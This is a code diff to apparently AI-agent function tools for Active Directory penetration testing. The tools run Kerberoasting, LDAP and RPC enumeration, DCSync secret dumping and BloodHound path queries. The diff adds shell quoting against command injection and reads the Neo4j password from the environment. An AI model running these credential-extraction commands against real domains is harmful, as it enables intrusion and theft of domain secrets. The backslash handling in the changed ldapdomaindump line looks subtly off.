@@ -22,7 +22,9 @@ Authorization: Only use within authorized penetration testing scope.
 """
 
 import json
+import os
 import re
+import shlex
 import subprocess  # nosec B404
 
 from kryon.sdk.agents import function_tool
@@ -152,10 +154,11 @@ def kerberoast(
             password="<REDACTED>"
         )
     """
+    cred = f"{shlex.quote(domain)}/{shlex.quote(username)}:{shlex.quote(password)}" if username else f"{shlex.quote(domain)}/"
     cmd_parts = [
         "impacket-GetUserSPNs",
-        f"{domain}/{username}:{password}" if username else f"{domain}/",
-        f"-dc-ip {domain_controller}",
+        cred,
+        f"-dc-ip {shlex.quote(domain_controller)}",
         "-request",
         "-outputfile /tmp/kerberoast_hashes.txt",
     ]
@@ -298,13 +301,14 @@ def enumerate_ad(
     }
 
     # 1. enum4linux-ng for basic enumeration
+    safe_dc = shlex.quote(domain_controller)
     if username and password:
         enum_cmd = (
-            f"enum4linux-ng -A -u '{username}' -p '{password}' "
-            f"{domain_controller}"
+            f"enum4linux-ng -A -u {shlex.quote(username)} -p {shlex.quote(password)} "
+            f"{safe_dc}"
         )
     else:
-        enum_cmd = f"enum4linux-ng -A {domain_controller}"
+        enum_cmd = f"enum4linux-ng -A {safe_dc}"
 
     enum_output = _run_cmd(enum_cmd, timeout=180)
     results["output"]["enum4linux"] = enum_output
@@ -327,13 +331,13 @@ def enumerate_ad(
     # 2. ldapdomaindump for LDAP data
     if username and password:
         ldap_cmd = (
-            f"ldapdomaindump {domain_controller} "
-            f"-u '{domain}\\{username}' -p '{password}' "
+            f"ldapdomaindump {safe_dc} "
+            f"-u {shlex.quote(f'{domain}\\\\{username}')} -p {shlex.quote(password)} "
             f"-o /tmp/ldapdomaindump/"
         )
     else:
         ldap_cmd = (
-            f"ldapdomaindump {domain_controller} "
+            f"ldapdomaindump {safe_dc} "
             f"-o /tmp/ldapdomaindump/"
         )
 
@@ -343,11 +347,11 @@ def enumerate_ad(
     # 3. rpcclient for RPC-based queries (users, groups)
     if username and password:
         rpc_base = (
-            f"rpcclient -U '{domain}/{username}%{password}' "
-            f"{domain_controller}"
+            f"rpcclient -U {shlex.quote(f'{domain}/{username}%{password}')} "
+            f"{safe_dc}"
         )
     else:
-        rpc_base = f"rpcclient -U '' -N {domain_controller}"
+        rpc_base = f"rpcclient -U '' -N {safe_dc}"
 
     # Enumerate domain users via RPC
     rpc_users_cmd = f'{rpc_base} -c "enumdomusers"'
@@ -418,7 +422,7 @@ def dcsync_attack(
     """
     cmd = (
         f"impacket-secretsdump "
-        f"'{domain}/{username}:{password}'@{domain_controller} "
+        f"{shlex.quote(f'{domain}/{username}:{password}')}@{shlex.quote(domain_controller)} "
         f"-outputfile /tmp/dcsync_dump"
     )
 
@@ -512,10 +516,11 @@ def find_attack_path(
     )
 
     # Try neo4j-client CLI
+    _neo4j_pass = os.environ.get("NEO4J_PASSWORD", "bloodhound")
     cmd = (
-        f'cypher-shell -u neo4j -p bloodhound '
+        f'cypher-shell -u neo4j -p {shlex.quote(_neo4j_pass)} '
         f'-a bolt://localhost:7687 '
-        f'"{cypher_query}"'
+        f'{shlex.quote(cypher_query)}'
     )
 
     raw_output = _run_cmd(cmd, timeout=60)
